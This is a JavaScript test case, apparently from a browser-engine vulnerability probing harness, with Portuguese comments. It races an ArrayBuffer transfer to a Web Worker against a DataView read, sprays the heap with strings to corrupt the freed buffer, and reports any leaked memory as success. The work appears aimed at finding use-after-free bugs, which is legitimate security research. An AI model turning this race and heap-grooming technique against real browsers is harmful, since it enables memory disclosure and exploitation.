import { Groomer } from '../mod_groomer.js';

export default {
    id:       'TYPEDARRAY_NEUTER_RACE',
    category: 'Concurrency',
    risk:     'CRITICAL',
    description:
        'Transferência de um ArrayBuffer para um Web Worker (Neutering) enquanto ' +
        'a thread principal tenta ler os dados simultaneamente através de uma DataView. ' +
        'Se o C++ falhar no bloqueio (Locking), ocorre um Use-After-Free da RAM bruta.',

    setup: function() {
        this.results = {};
        
        // Criamos um ArrayBuffer suculento (1MB) e uma View para o ler
        this.buffer = new ArrayBuffer(1024 * 1024);
        this.view = new DataView(this.buffer);
        
        // Escrevemos uma marca reconhecível
        this.view.setUint32(0, 0xDEADBEEF, true);

        // Criamos um Web Worker inline (sem precisar de ficheiro extra)
        const blob = new Blob(['self.onmessage = function(e) { self.postMessage("ok"); }'], { type: 'application/javascript' });
        this.worker = new Worker(URL.createObjectURL(blob));
    },

    trigger: function() {
        // O GATILHO DA CORRIDA (RACE CONDITION)
        try {
            // 1. Mandamos o buffer para o Worker (Isto retira a ownership da thread principal)
            this.worker.postMessage({ buf: this.buffer }, [this.buffer]);
            
            // 2. Lemos imediatamente a View! O buffer deveria estar bloqueado/zerado.
            // Se o motor falhar o timing, isto lê memória libertada!
            this.results.leaked = this.view.getUint32(0, true);
        } catch(e) {
            this.results.error = e.constructor.name;
        }
        
        // Inundamos a memória para tentar corromper o buffer recém-libertado
        let trash = Groomer.sprayStrings(1024, 1000);
    },

    probe: [
        // Probe 0: O C++ cortou o tamanho do buffer para 0 (comportamento seguro)?
        s => s.buffer.byteLength,
        
        // Probe 1: O que conseguimos ler durante a corrida?
        s => {
            if (s.results.error) return `Protegido: ${s.results.error}`;
            if (s.results.leaked !== undefined) {
                if (s.results.leaked === 0xDEADBEEF) return 'Leu stale data (seguro)';
                return `💥 SUCESSO! INFO LEAK Bruto: 0x${s.results.leaked.toString(16)}`;
            }
            return 'Nada lido';
        }
    ],

    cleanup: function() {
        if (this.worker) this.worker.terminate();
        this.buffer = null;
        this.view = null;
        this.results = {};
    }
};